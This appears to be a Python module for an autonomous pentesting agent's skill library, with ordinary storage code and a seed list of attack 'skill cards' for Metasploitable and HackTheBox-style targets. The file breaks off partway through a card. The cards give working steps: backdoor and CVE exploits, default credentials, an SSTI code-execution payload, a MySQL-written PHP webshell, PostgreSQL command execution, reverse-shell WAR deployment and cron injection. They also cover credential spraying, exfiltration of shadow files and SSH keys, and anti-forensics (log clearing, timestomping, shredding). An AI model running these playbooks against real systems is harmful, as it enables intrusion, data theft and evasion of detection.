#!/usr/bin/env python3
"""
core/postmortem/skill_library.py — ARIASKA SkillLibrary v1.0

Simple JSON-based store for skill cards with promote/prune/merge operations.
All operations are audited for reproducibility.

Features:
- JSON file storage (low risk, easy to debug)
- Promote: Add new skill cards to library
- Prune: Remove duplicate or low-confidence skills
- Merge: Combine similar skill cards
- Audit log for all operations
"""

import os
import json
import time
import logging
import hashlib
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from pathlib import Path
from datetime import datetime

from core.postmortem.orion_postmortem import SkillCard, MemoryOperation

logger = logging.getLogger("ariaska.skill_library")


@dataclass
class AuditLogEntry:
    """An entry in the audit log."""
    timestamp: float
    operation: str  # "promote", "prune", "merge"
    target_id: str
    details: Dict[str, Any]
    success: bool
    error_message: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class SkillLibrary:
    """
    JSON-based storage for learned skill cards.
    
    The library stores skills in a simple JSON file for easy debugging
    and version control. All operations are logged to an audit file.
    
    Skill cards represent learned patterns:
    - if_condition: When to apply the skill
    - then_action: What action to take
    - confidence: How confident we are in this skill
    """
    
    def __init__(
        self,
        library_path: str = "core/memory/skill_library.json",
        audit_path: str = "core/memory/skill_audit.jsonl"
    ):
        self.library_path = Path(library_path)
        self.audit_path = Path(audit_path)
        
        # Ensure directories exist
        self.library_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Load existing library
        self.skills: Dict[str, SkillCard] = {}
        self._load_library()
        
        logger.info(f"SkillLibrary initialized with {len(self.skills)} skills")
    
    def _load_library(self):
        """Load skill library from disk."""
        if self.library_path.exists():
            try:
                with open(self.library_path, "r") as f:
                    data = json.load(f)
                
                for skill_id, skill_data in data.get("skills", {}).items():
                    self.skills[skill_id] = SkillCard.from_dict(skill_data)
                
                logger.info(f"Loaded {len(self.skills)} skills from library")
            except Exception as e:
                logger.error(f"Failed to load skill library: {e}")
                self.skills = {}
        else:
            logger.info("No existing skill library found, starting fresh")
    
    def _save_library(self):
        """Save skill library to disk."""
        try:
            data = {
                "version": "1.0",
                "last_updated": time.time(),
                "skill_count": len(self.skills),
                "skills": {sid: s.to_dict() for sid, s in self.skills.items()}
            }
            
            with open(self.library_path, "w") as f:
                json.dump(data, f, indent=2)
            
            logger.debug(f"Saved {len(self.skills)} skills to library")
        except Exception as e:
            logger.error(f"Failed to save skill library: {e}")
    
    def _audit_log(self, entry: AuditLogEntry):
        """Write an entry to the audit log."""
        try:
            with open(self.audit_path, "a") as f:
                f.write(json.dumps(entry.to_dict()) + "\n")
        except Exception as e:
            logger.error(f"Failed to write audit log: {e}")
    
    def promote(self, skill: SkillCard, reason: str = "") -> bool:
        """
        Promote a skill card to the library.
        
        Args:
            skill: The skill card to promote
            reason: Why this skill is being promoted
            
        Returns:
            bool: True if promoted successfully
        """
        try:
            # Check for duplicates
            if skill.id in self.skills:
                # Update existing skill if new one has higher confidence
                existing = self.skills[skill.id]
                if skill.confidence > existing.confidence:
                    self.skills[skill.id] = skill
                    self._audit_log(AuditLogEntry(
                        timestamp=time.time(),
                        operation="promote",
                        target_id=skill.id,
                        details={
                            "action": "updated",
                            "old_confidence": existing.confidence,
                            "new_confidence": skill.confidence,
                            "reason": reason
                        },
                        success=True
                    ))
                    self._save_library()
                    logger.info(f"Updated skill {skill.id} (confidence: {existing.confidence:.2f} -> {skill.confidence:.2f})")
                    return True
                else:
                    logger.info(f"Skill {skill.id} already exists with higher confidence, skipping")
                    return False
            
            # Add new skill
            self.skills[skill.id] = skill
            
            self._audit_log(AuditLogEntry(
                timestamp=time.time(),
                operation="promote",
                target_id=skill.id,
                details={
                    "action": "added",
                    "confidence": skill.confidence,
                    "if_condition": skill.if_condition[:50],
                    "then_action": skill.then_action[:50],
                    "reason": reason
                },
                success=True
            ))
            
            self._save_library()
            logger.info(f"Promoted skill {skill.id} to library")
            return True
            
        except Exception as e:
            self._audit_log(AuditLogEntry(
                timestamp=time.time(),
                operation="promote",
                target_id=skill.id,
                details={"reason": reason},
                success=False,
                error_message=str(e)
            ))
            logger.error(f"Failed to promote skill {skill.id}: {e}")
            return False
    
    def prune(self, skill_id: str, reason: str = "") -> bool:
        """
        Prune (remove) a skill from the library.
        
        Args:
            skill_id: ID of the skill to remove
            reason: Why this skill is being pruned
            
        Returns:
            bool: True if pruned successfully
        """
        try:
            if skill_id not in self.skills:
                logger.warning(f"Skill {skill_id} not found in library, cannot prune")
                return False
            
            skill = self.skills.pop(skill_id)
            
            self._audit_log(AuditLogEntry(
                timestamp=time.time(),
                operation="prune",
                target_id=skill_id,
                details={
                    "confidence": skill.confidence,
                    "if_condition": skill.if_condition[:50],
                    "reason": reason
                },
                success=True
            ))
            
            self._save_library()
            logger.info(f"Pruned skill {skill_id} from library")
            return True
            
        except Exception as e:
            self._audit_log(AuditLogEntry(
                timestamp=time.time(),
                operation="prune",
                target_id=skill_id,
                details={"reason": reason},
                success=False,
                error_message=str(e)
            ))
            logger.error(f"Failed to prune skill {skill_id}: {e}")
            return False
    
    def merge(self, skill_id: str, merge_with_id: str, reason: str = "") -> Optional[str]:
        """
        Merge two skill cards into one.
        
        The merged skill takes the higher confidence and combines evidence.
        
        Args:
            skill_id: Primary skill ID
            merge_with_id: Skill ID to merge into primary
            reason: Why these skills are being merged
            
        Returns:
            str: ID of merged skill, or None if failed
        """
        try:
            if skill_id not in self.skills:
                logger.warning(f"Primary skill {skill_id} not found")
                return None
            if merge_with_id not in self.skills:
                logger.warning(f"Merge target {merge_with_id} not found")
                return None
            
            primary = self.skills[skill_id]
            secondary = self.skills[merge_with_id]
            
            # Create merged skill
            merged = SkillCard(
                id=f"{skill_id}_merged",
                if_condition=primary.if_condition,  # Keep primary's condition
                then_action=primary.then_action,    # Keep primary's action
                parameters_template={**secondary.parameters_template, **primary.parameters_template},
                confidence=max(primary.confidence, secondary.confidence),
                evidence_refs=list(set(primary.evidence_refs + secondary.evidence_refs)),
                usage_count=primary.usage_count + secondary.usage_count,
                success_rate=(primary.success_rate + secondary.success_rate) / 2
            )
            
            # Remove old skills
            del self.skills[skill_id]
            del self.skills[merge_with_id]
            
            # Add merged skill
            self.skills[merged.id] = merged
            
            self._audit_log(AuditLogEntry(
                timestamp=time.time(),
                operation="merge",
                target_id=merged.id,
                details={
                    "merged_from": [skill_id, merge_with_id],
                    "new_confidence": merged.confidence,
                    "reason": reason
                },
                success=True
            ))
            
            self._save_library()
            logger.info(f"Merged {skill_id} + {merge_with_id} -> {merged.id}")
            return merged.id
            
        except Exception as e:
            self._audit_log(AuditLogEntry(
                timestamp=time.time(),
                operation="merge",
                target_id=f"{skill_id}+{merge_with_id}",
                details={"reason": reason},
                success=False,
                error_message=str(e)
            ))
            logger.error(f"Failed to merge skills: {e}")
            return None
    
    def prune_duplicates(self, similarity_threshold: float = 0.9) -> int:
        """
        Prune duplicate skills based on string similarity.
        
        Uses simple hash-based comparison for now.
        
        Args:
            similarity_threshold: Minimum similarity to consider duplicate
            
        Returns:
            int: Number of skills pruned
        """
        pruned = 0
        skill_hashes: Dict[str, str] = {}
        to_prune: List[str] = []
        
        for skill_id, skill in self.skills.items():
            # Create normalized hash
            content = f"{skill.if_condition.lower().strip()}|{skill.then_action.lower().strip()}"
            content_hash = hashlib.md5(content.encode()).hexdigest()
            
            if content_hash in skill_hashes:
                # Duplicate found - keep the one with higher confidence
                existing_id = skill_hashes[content_hash]
                existing = self.skills.get(existing_id)
                
                if existing and skill.confidence > existing.confidence:
                    # New one is better, mark old for pruning
                    to_prune.append(existing_id)
                    skill_hashes[content_hash] = skill_id
                else:
                    # Old one is better, mark new for pruning
                    to_prune.append(skill_id)
            else:
                skill_hashes[content_hash] = skill_id
        
        # Prune duplicates
        for skill_id in to_prune:
            if self.prune(skill_id, reason="Duplicate skill detected"):
                pruned += 1
        
        if pruned > 0:
            logger.info(f"Pruned {pruned} duplicate skills")
        
        return pruned
    
    def apply_memory_ops(self, ops: List[MemoryOperation], skills: List[SkillCard]) -> Dict[str, int]:
        """
        Apply a list of memory operations deterministically.
        
        Args:
            ops: List of memory operations from postmortem
            skills: List of skill cards to potentially promote
            
        Returns:
            Dict with counts of operations performed
        """
        results = {"promoted": 0, "pruned": 0, "merged": 0, "failed": 0}
        
        # Build skill lookup
        skill_lookup = {s.id: s for s in skills}
        
        for op in ops:
            try:
                if op.operation == "promote":
                    skill_id = op.skill_card_id or op.target
                    if skill_id in skill_lookup:
                        if self.promote(skill_lookup[skill_id], reason=op.reason):
                            results["promoted"] += 1
                        else:
                            results["failed"] += 1
                    else:
                        logger.warning(f"Skill {skill_id} not found for promotion")
                        results["failed"] += 1
                
                elif op.operation == "prune":
                    if self.prune(op.target, reason=op.reason):
                        results["pruned"] += 1
                    else:
                        results["failed"] += 1
                
                elif op.operation == "merge":
                    if op.merge_with:
                        if self.merge(op.target, op.merge_with, reason=op.reason):
                            results["merged"] += 1
                        else:
                            results["failed"] += 1
                    else:
                        logger.warning(f"Merge operation missing merge_with target")
                        results["failed"] += 1
                
            except Exception as e:
                logger.error(f"Failed to apply operation {op.operation}: {e}")
                results["failed"] += 1
        
        logger.info(f"Applied memory ops: {results}")
        return results
    
    def get_skill(self, skill_id: str) -> Optional[SkillCard]:
        """Get a skill by ID."""
        return self.skills.get(skill_id)
    
    def get_all_skills(self) -> List[SkillCard]:
        """Get all skills in the library."""
        return list(self.skills.values())
    
    def get_skills_for_condition(self, condition_keywords: List[str]) -> List[SkillCard]:
        """
        Find skills matching condition keywords using semantic + keyword hybrid.

        Phase 6.9.6: Uses SentenceTransformer cosine similarity when available,
        falls back to keyword matching. Combines both scores for robust matching.

        Args:
            condition_keywords: Keywords to match in if_condition

        Returns:
            List of matching skills, sorted by relevance score
        """
        if not self.skills:
            return []

        query_text = " ".join(condition_keywords).lower()
        scored: List[Tuple[float, SkillCard]] = []

        # --- Keyword matching (always available) ---
        for skill in self.skills.values():
            condition_lower = skill.if_condition.lower()
            kw_hits = sum(1 for kw in condition_keywords if kw.lower() in condition_lower)
            kw_score = kw_hits / max(len(condition_keywords), 1)

            if kw_score > 0:
                scored.append((kw_score, skill))

        # --- Semantic matching (if SentenceTransformer available) ---
        try:
            if not hasattr(self, '_embedder'):
                from sentence_transformers import SentenceTransformer
                self._embedder = SentenceTransformer("sentence-transformers/all-MiniLM-L6-v2")
                # Pre-compute skill embeddings (cached)
                self._skill_embeddings: Dict[str, Any] = {}

            if self._embedder is not None:
                import numpy as np

                # Embed query
                query_emb = self._embedder.encode(query_text, normalize_embeddings=True)

                # Embed skills (lazy, cached)
                for sid, skill in self.skills.items():
                    if sid not in self._skill_embeddings:
                        self._skill_embeddings[sid] = self._embedder.encode(
                            skill.if_condition, normalize_embeddings=True
                        )

                # Compute cosine similarities
                semantic_scores: Dict[str, float] = {}
                for sid, skill in self.skills.items():
                    emb = self._skill_embeddings.get(sid)
                    if emb is not None:
                        sim = float(np.dot(query_emb, emb))
                        if sim > 0.3:  # Minimum relevance threshold
                            semantic_scores[sid] = sim

                # Merge keyword + semantic scores
                merged: Dict[str, Tuple[float, SkillCard]] = {}

                # Add keyword matches
                for score, skill in scored:
                    merged[skill.id] = (score, skill)

                # Add/boost with semantic matches
                for sid, sem_score in semantic_scores.items():
                    skill = self.skills[sid]
                    if sid in merged:
                        # Combine: 60% semantic + 40% keyword
                        kw_s = merged[sid][0]
                        combined = 0.4 * kw_s + 0.6 * sem_score
                        merged[sid] = (combined, skill)
                    else:
                        merged[sid] = (sem_score * 0.6, skill)

                scored = list(merged.values())

        except ImportError:
            logger.debug("SentenceTransformer not available, using keyword-only matching")
        except Exception as e:
            logger.debug(f"Semantic matching failed (non-fatal): {e}")

        # Sort by score * confidence (relevance × reliability)
        scored.sort(key=lambda x: x[0] * x[1].confidence, reverse=True)
        return [skill for _, skill in scored]
    
    def get_top_skills(self, n: int = 10) -> List[SkillCard]:
        """Get top N skills by confidence."""
        sorted_skills = sorted(
            self.skills.values(),
            key=lambda s: s.confidence,
            reverse=True
        )
        return sorted_skills[:n]
    
    def get_stats(self) -> Dict[str, Any]:
        """Get library statistics."""
        if not self.skills:
            return {"total_skills": 0}
        
        confidences = [s.confidence for s in self.skills.values()]
        
        return {
            "total_skills": len(self.skills),
            "avg_confidence": sum(confidences) / len(confidences),
            "max_confidence": max(confidences),
            "min_confidence": min(confidences),
            "high_confidence_count": sum(1 for c in confidences if c >= 0.8)
        }
    
    def get_audit_log(self, limit: int = 100) -> List[Dict[str, Any]]:
        """Get recent audit log entries."""
        entries = []
        if self.audit_path.exists():
            with open(self.audit_path, "r") as f:
                for line in f:
                    if line.strip():
                        entries.append(json.loads(line))
        
        return entries[-limit:]

    def seed_skills(self) -> int:
        """Pre-seed the library with 55+ expert skill cards from knowledge packs.

        Each card encodes WHY and WHEN reasoning so PPO agents learn to think,
        not just execute scripts.  Skills cover MS2 (normal+hard), MS3, HTB
        common patterns, anti-forensics, and strategic reasoning.

        Returns:
            int: Number of skills promoted.
        """
        promoted = 0
        seeds: List[SkillCard] = [
            # ─── MS2: Instant-root paths (highest confidence) ────────
            SkillCard(
                id="ms2_vsftpd_backdoor",
                if_condition="Port 21 open AND service is vsftpd 2.3.4",
                then_action="exploit/unix/ftp/vsftpd_234_backdoor → root shell. WHY: vsftpd 2.3.4 has a hardcoded backdoor triggered by ':)' in username; opens shell on port 6200.",
                confidence=0.98,
                evidence_refs=["CVE-2011-2523", "ms2_kill_chain_fastest_root"],
            ),
            SkillCard(
                id="ms2_samba_usermap",
                if_condition="Ports 139/445 open AND Samba 3.0.20",
                then_action="exploit/multi/samba/usermap_script → root shell. WHY: CVE-2007-2447 allows command injection via username field in Samba 3.0.20-3.0.25rc3; no authentication needed.",
                confidence=0.97,
                evidence_refs=["CVE-2007-2447", "ms2_kill_chain_samba_chain"],
            ),
            SkillCard(
                id="ms2_ingreslock_backdoor",
                if_condition="Port 1524 open (ingreslock)",
                then_action="telnet {target} 1524 → instant root shell. WHY: ingreslock is a legacy backdoor that provides root without authentication on port 1524.",
                confidence=0.99,
                evidence_refs=["ms2_kill_chain_fastest_root"],
            ),
            SkillCard(
                id="ms2_unrealircd_backdoor",
                if_condition="Port 6667 open AND UnrealIRCd 3.2.8.1",
                then_action="exploit/unix/irc/unreal_ircd_3281_backdoor → root shell. WHY: UnrealIRCd 3.2.8.1 has a backdoor in the PASS command; sends 'AB;' followed by any system command.",
                confidence=0.96,
                evidence_refs=["CVE-2010-2075"],
            ),
            SkillCard(
                id="ms2_java_rmi_rce",
                if_condition="Port 1099 open AND Java RMI Registry",
                then_action="exploit/multi/misc/java_rmi_server → remote code execution. WHY: Java RMI allows deserialization attacks; MS2's version is unpatched.",
                confidence=0.93,
                evidence_refs=["ms2_services"],
            ),
            # ─── MS2: Credential-based access ────────────────────────
            SkillCard(
                id="ms2_ssh_default_creds",
                if_condition="Port 22 open AND target is MS2",
                then_action="ssh msfadmin@{target} with password 'msfadmin'. WHY: MS2 ships with default credentials msfadmin:msfadmin that are never changed.",
                confidence=0.95,
                evidence_refs=["ms2_credentials"],
            ),
            SkillCard(
                id="ms2_mysql_no_password",
                if_condition="Port 3306 open AND MySQL 5.0.51a",
                then_action="mysql -h {target} -u root → no password required. WHY: MySQL on MS2 has root with empty password, allowing direct database access for credential dumps.",
                confidence=0.94,
                evidence_refs=["ms2_credentials"],
            ),
            SkillCard(
                id="ms2_postgres_default",
                if_condition="Port 5432 open AND PostgreSQL 8.3",
                then_action="psql -h {target} -U postgres (password: postgres), then COPY ... FROM PROGRAM for RCE. WHY: Default creds + COPY FROM PROGRAM = command execution as postgres user.",
                confidence=0.93,
                evidence_refs=["CVE-2019-9193", "ms2_credentials"],
            ),
            SkillCard(
                id="ms2_vnc_password",
                if_condition="Port 5900 open AND VNC service",
                then_action="vncviewer {target} with password 'password'. WHY: VNC on MS2 uses trivial password, granting desktop access for GUI-based attacks.",
                confidence=0.92,
                evidence_refs=["ms2_credentials"],
            ),
            SkillCard(
                id="ms2_tomcat_manager",
                if_condition="Port 8180 open AND Apache Tomcat",
                then_action="Login tomcat:tomcat to /manager/html, deploy WAR file with msfvenom shell. WHY: Default Tomcat manager creds allow deploying arbitrary Java applications.",
                confidence=0.94,
                evidence_refs=["ms2_credentials"],
            ),
            # ─── MS2: Multi-step chains ──────────────────────────────
            SkillCard(
                id="ms2_nfs_to_ssh",
                if_condition="Port 2049 open (NFS) AND / is world-readable",
                then_action="Mount NFS share → write SSH key to /root/.ssh/authorized_keys → ssh root@target. WHY: NFS exports / with no_root_squash, so we can write as root remotely.",
                confidence=0.91,
                evidence_refs=["ms2_kill_chain_nfs_to_root"],
            ),
            SkillCard(
                id="ms2_rsh_no_auth",
                if_condition="Ports 512-514 open (rexec/rlogin/rsh)",
                then_action="rsh {target} as root — no authentication required. WHY: Legacy r-services trust .rhosts; MS2 has permissive configuration allowing remote root.",
                confidence=0.90,
                evidence_refs=["ms2_services"],
            ),
            SkillCard(
                id="ms2_smtp_enum",
                if_condition="Port 25 open AND Postfix SMTP",
                then_action="VRFY command to enumerate valid users → build target list for brute-force. WHY: SMTP VRFY reveals which usernames exist, enabling focused credential attacks.",
                confidence=0.85,
                evidence_refs=["ms2_services"],
            ),
            SkillCard(
                id="ms2_dvwa_sqli",
                if_condition="Port 80 open AND DVWA detected",
                then_action="sqlmap against DVWA login → extract credentials → escalate. WHY: DVWA has intentional SQL injection in low-security mode; extracting admin hash leads to shell.",
                confidence=0.88,
                evidence_refs=["ms2_services"],
            ),
            # ─── MS3: Key attack paths ───────────────────────────────
            SkillCard(
                id="ms3_jenkins_groovy",
                if_condition="Port 8484 open AND Jenkins detected",
                then_action="Access /script console → execute Groovy: 'cmd'.execute(). WHY: Jenkins script console allows arbitrary Groovy code execution as the Jenkins service user.",
                confidence=0.90,
                evidence_refs=["ms3_kill_chain_jenkins_to_root"],
            ),
            SkillCard(
                id="ms3_tomcat_war_deploy",
                if_condition="Port 8282 open AND Tomcat on MS3",
                then_action="Login sploit:sploit to manager → deploy msfvenom WAR shell. WHY: MS3 Tomcat has weak default credentials allowing application deployment.",
                confidence=0.89,
                evidence_refs=["ms3_credentials"],
            ),
            SkillCard(
                id="ms3_elasticsearch_rce",
                if_condition="Port 9200 open AND Elasticsearch 1.1.1",
                then_action="CVE-2014-3120: MVEL script execution → RCE. WHY: Pre-1.2.0 Elasticsearch allows dynamic scripting, enabling arbitrary code execution via search queries.",
                confidence=0.88,
                evidence_refs=["CVE-2014-3120", "ms3_services"],
            ),
            SkillCard(
                id="ms3_manageengine_upload",
                if_condition="Port 8020 open AND ManageEngine Desktop Central",
                then_action="CVE-2015-8249: Unrestricted file upload → webshell → RCE. WHY: ManageEngine has unauthenticated file upload allowing JSP shell deployment.",
                confidence=0.87,
                evidence_refs=["CVE-2015-8249", "ms3_services"],
            ),
            SkillCard(
                id="ms3_ssh_vagrant",
                if_condition="Port 22 open AND target is MS3",
                then_action="ssh msfadmin@{target} with password 'msfadmin'. WHY: MS3 Docker uses default msfadmin:msfadmin credentials and msfadmin is in the sudo group for root access.",
                confidence=0.92,
                evidence_refs=["ms3_credentials"],
            ),
            SkillCard(
                id="ms3_struts_rce",
                if_condition="Port 8282 open AND Apache Struts detected",
                then_action="CVE-2017-5638: OGNL injection in Content-Type header → RCE. WHY: Apache Struts Jakarta Multipart parser allows OGNL injection triggering command execution.",
                confidence=0.86,
                evidence_refs=["CVE-2017-5638", "ms3_cves"],
            ),
            # ─── HTB: Common patterns ────────────────────────────────
            SkillCard(
                id="htb_sqli_credential_dump",
                if_condition="Web application with login form AND no input sanitization",
                then_action="sqlmap -u URL --forms --dump → extract credentials → SSH with dumped creds. WHY: SQL injection bypasses authentication and extracts stored password hashes.",
                confidence=0.85,
                evidence_refs=["htb_common_patterns"],
            ),
            SkillCard(
                id="htb_ssti_to_rce",
                if_condition="Web app reflects user input in templates (Jinja2, Twig, Smarty)",
                then_action="Test {{7*7}} → if 49, inject {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. WHY: Template engines evaluate expressions; SSTI chains lead to arbitrary code execution.",
                confidence=0.82,
                evidence_refs=["htb_common_patterns"],
            ),
            SkillCard(
                id="htb_file_upload_bypass",
                if_condition="File upload endpoint detected AND extension filtering present",
                then_action="Upload .php5/.phtml/.phar with magic bytes → access webshell. WHY: Many filters only check .php extension; alternative extensions bypass the check but still execute.",
                confidence=0.80,
                evidence_refs=["htb_common_patterns"],
            ),
            SkillCard(
                id="htb_lfi_to_rce",
                if_condition="Local File Inclusion vulnerability detected (path traversal)",
                then_action="LFI to read /etc/passwd → find users → LFI + log poisoning for RCE. WHY: LFI reads arbitrary files; poisoning Apache access.log with PHP code turns LFI into code execution.",
                confidence=0.78,
                evidence_refs=["htb_common_patterns"],
            ),
            SkillCard(
                id="htb_suid_privesc",
                if_condition="Shell obtained AND running as non-root user",
                then_action="find /usr /bin /sbin -perm -4000 2>/dev/null → check GTFOBins for exploitable SUID. WHY: SUID binaries run as owner (often root); GTFOBins documents how to escalate via common binaries.",
                confidence=0.88,
                evidence_refs=["htb_common_patterns"],
            ),
            SkillCard(
                id="htb_sudo_l_privesc",
                if_condition="Shell obtained AND user has sudo privileges",
                then_action="sudo -l → find NOPASSWD entries → use GTFOBins techniques. WHY: Misconfigured sudo rules (e.g., sudo vim, sudo python) allow trivial root escalation.",
                confidence=0.87,
                evidence_refs=["htb_common_patterns"],
            ),
            SkillCard(
                id="htb_kernel_exploit",
                if_condition="Linux shell AND kernel version < 4.x",
                then_action="uname -r → searchsploit linux kernel → compile and run exploit. WHY: Older kernels have public exploits (DirtyCow, overlayfs) that give instant root.",
                confidence=0.83,
                evidence_refs=["htb_common_patterns"],
            ),
            SkillCard(
                id="htb_docker_escape",
                if_condition="Shell inside Docker container AND docker.sock mounted",
                then_action="docker run -v /:/host --rm -it alpine chroot /host. WHY: Mounting host filesystem via docker.sock gives full host access from inside the container.",
                confidence=0.80,
                evidence_refs=["htb_common_patterns"],
            ),
            SkillCard(
                id="htb_cron_privesc",
                if_condition="Shell obtained AND writable cron scripts found",
                then_action="Inject reverse shell into writable cron job → wait for execution. WHY: Cron jobs run as their configured user; writable scripts owned by root = root shell.",
                confidence=0.84,
                evidence_refs=["htb_common_patterns"],
            ),
            # ─── Phase reasoning: WHEN to do what ────────────────────
            SkillCard(
                id="phase_recon_strategy",
                if_condition="Episode start OR no ports discovered yet",
                then_action="Run nmap_quick_scan first, then nmap_service_version. WHY: You must discover the attack surface before you can exploit it. Quick scan finds ports; version scan identifies exploitable services.",
                confidence=0.95,
                evidence_refs=["phase_reasoning"],
            ),
            SkillCard(
                id="phase_enum_strategy",
                if_condition="Ports discovered AND services not yet fingerprinted",
                then_action="Run service-specific enumeration (enum4linux, nikto, gobuster). WHY: Knowing exact versions reveals specific CVEs; enumeration turns 'port 80 open' into 'Apache 2.2.8 with DVWA'.",
                confidence=0.93,
                evidence_refs=["phase_reasoning"],
            ),
            SkillCard(
                id="phase_exploit_timing",
                if_condition="Services enumerated AND known vulnerabilities identified",
                then_action="Exploit the EASIEST path first (backdoors before brute-force). WHY: Backdoors (vsftpd, ingreslock, UnrealIRCd) give instant root; trying complex exploits first wastes steps.",
                confidence=0.92,
                evidence_refs=["phase_reasoning"],
            ),
            SkillCard(
                id="phase_privesc_strategy",
                if_condition="User shell obtained AND not root",
                then_action="Run linpeas/find_suid/sudo_check in sequence. WHY: LinPEAS finds 90% of privesc vectors; SUID and sudo checks are the most common escalation paths on Linux.",
                confidence=0.90,
                evidence_refs=["phase_reasoning"],
            ),
            SkillCard(
                id="phase_lateral_strategy",
                if_condition="Root on one host AND other hosts visible on network",
                then_action="Dump credentials from compromised host → spray across network. WHY: Credential reuse is the #1 lateral movement vector; dumped hashes/passwords often work on other hosts.",
                confidence=0.85,
                evidence_refs=["phase_reasoning"],
            ),
            SkillCard(
                id="phase_exfil_strategy",
                if_condition="Root shell AND sensitive data located",
                then_action="Exfiltrate /etc/shadow, SSH keys, database dumps. WHY: These prove total compromise — shadow file shows password control, SSH keys enable persistent access.",
                confidence=0.88,
                evidence_refs=["phase_reasoning"],
            ),
            # ─── Anti-forensics reasoning ────────────────────────────
            SkillCard(
                id="antiforensics_log_clearing",
                if_condition="CLOSEOUT phase AND shells obtained during engagement",
                then_action="Clear bash_history, auth.log, wtmp, btmp, syslog IN ORDER. WHY: Logs record every action; clearing from most specific (bash_history) to most general (syslog) ensures no trace of commands remains.",
                confidence=0.90,
                evidence_refs=["ms2_anti_forensics_knowledge"],
            ),
            SkillCard(
                id="antiforensics_timestomp",
                if_condition="CLOSEOUT phase AND files modified during engagement",
                then_action="touch -r /etc/hosts <modified_file> to restore timestamps. WHY: File timestamps are forensic evidence; timestomping makes modified files appear unaltered.",
                confidence=0.87,
                evidence_refs=["ms2_anti_forensics_knowledge"],
            ),
            SkillCard(
                id="antiforensics_shred",
                if_condition="CLOSEOUT phase AND tools/payloads left on target",
                then_action="shred -vfzu -n 5 <file> for secure deletion. WHY: rm only removes directory entries; shred overwrites data blocks making file recovery impossible.",
                confidence=0.88,
                evidence_refs=["ms2_anti_forensics_knowledge"],
            ),
            SkillCard(
                id="antiforensics_ssh_fingerprint",
                if_condition="CLOSEOUT phase AND SSH was used during engagement",
                then_action="Remove target from ~/.ssh/known_hosts. WHY: known_hosts entries prove you connected to the target; removing them eliminates SSH forensic evidence on attacker machine.",
                confidence=0.85,
                evidence_refs=["ms2_anti_forensics_knowledge"],
            ),
            # ─── MS2 HARD MODE: Multi-step chains (no backdoors) ─────
            SkillCard(
                id="ms2_hard_mysql_webshell",
                if_condition="HARD difficulty AND Port 3306 open AND MySQL no-password",
                then_action="mysql -h {target} -u root → SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/shell.php' → curl http://{target}/shell.php?c=id. WHY: When backdoors are blocked, MySQL's INTO OUTFILE writes a webshell to Apache's docroot. No exploit module needed — just SQL.",
                confidence=0.91,
                evidence_refs=["ms2_hard_chain"],
            ),
            SkillCard(
                id="ms2_hard_nfs_chain",
                if_condition="HARD difficulty AND Port 2049 open (NFS)",
                then_action="showmount -e {target} → mount -t nfs {target}:/ /mnt → ssh-keygen → write pubkey to /mnt/root/.ssh/authorized_keys → ssh root@{target}. WHY: NFS with no_root_squash lets us write as root remotely. This 4-step chain gives persistent root access without any exploit.",
                confidence=0.92,
                evidence_refs=["ms2_kill_chain_nfs_to_root"],
            ),
            SkillCard(
                id="ms2_hard_tomcat_war",
                if_condition="HARD difficulty AND Port 8180 open AND Tomcat",
                then_action="msfvenom -p java/jsp_shell_reverse_tcp → curl --upload-file shell.war http://tomcat:tomcat@{target}:8180/manager/deploy → trigger. WHY: Tomcat default creds (tomcat:tomcat) allow WAR deployment. This is a CREDENTIAL-based exploit — not blocked by hard mode.",
                confidence=0.90,
                evidence_refs=["ms2_credentials"],
            ),
            SkillCard(
                id="ms2_hard_postgres_rce",
                if_condition="HARD difficulty AND Port 5432 open AND PostgreSQL",
                then_action="psql -h {target} -U postgres → CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;. WHY: PostgreSQL COPY FROM PROGRAM executes OS commands. Default creds (postgres:postgres) + SQL RCE = shell without exploit modules.",
                confidence=0.89,
                evidence_refs=["ms2_credentials"],
            ),
            SkillCard(
                id="ms2_hard_web_dvwa_chain",
                if_condition="HARD difficulty AND Port 80 open AND DVWA detected",
                then_action="dirb http://{target} → login DVWA (admin:password) → SQL injection in vuln pages → extract /etc/passwd via UNION SELECT LOAD_FILE → crack hashes → SSH. WHY: Multi-step web chain using DVWA's intentional vulns. Teaches enumeration→exploitation→post-exploitation arc.",
                confidence=0.86,
                evidence_refs=["ms2_services"],
            ),
            SkillCard(
                id="ms2_hard_distcc_privesc",
                if_condition="HARD difficulty AND Port 3632 open AND distccd",
                then_action="exploit/unix/misc/distcc_exec → daemon user shell → find / -perm -4000 → nmap --interactive → !sh for root. WHY: distccd gives low-priv shell (daemon). Old nmap with SUID has --interactive mode → shell escape to root. Two-step chain.",
                confidence=0.85,
                evidence_refs=["CVE-2004-2687"],
            ),
            SkillCard(
                id="ms2_hard_php_cgi_chain",
                if_condition="HARD difficulty AND Port 80 open AND PHP-CGI detected",
                then_action="nikto -h {target} → discover /cgi-bin/ → exploit/multi/http/php_cgi_arg_injection → www-data shell → kernel privesc. WHY: PHP-CGI argument injection (CVE-2012-1823) gives www-data shell. Then enumerate kernel version for privilege escalation.",
                confidence=0.83,
                evidence_refs=["CVE-2012-1823"],
            ),
            # ─── Advanced Reasoning: Multi-target strategy ────────────
            SkillCard(
                id="strategy_difficulty_adaptation",
                if_condition="Easy paths are blocked (medium/hard difficulty)",
                then_action="STOP trying backdoors. Enumerate: MySQL(3306), PostgreSQL(5432), NFS(2049), Tomcat(8180), DVWA(80), distccd(3632). These are the MULTI-STEP vectors. WHY: Hard mode specifically blocks single-step root paths. The agent must pivot to credential-based and web-based chains.",
                confidence=0.94,
                evidence_refs=["difficulty_presets"],
            ),
            SkillCard(
                id="strategy_parallel_vectors",
                if_condition="Single exploit path is failing or stuck",
                then_action="Maintain 3+ parallel attack vectors simultaneously. If MySQL fails, try NFS. If NFS fails, try web. WHY: Real penetration tests never rely on a single vector — redundancy is key.",
                confidence=0.88,
                evidence_refs=["ms2_kill_chain_multi_vector"],
            ),
            SkillCard(
                id="strategy_credential_spray",
                if_condition="Credentials found AND multiple services open",
                then_action="Test found credentials against ALL open services (SSH, Telnet, MySQL, FTP). WHY: Credential reuse is the #1 post-exploitation technique. Users reuse passwords across services 70%+ of the time.",
                confidence=0.91,
                evidence_refs=["lateral_movement_patterns"],
            ),
            SkillCard(
                id="strategy_exploit_ordering",
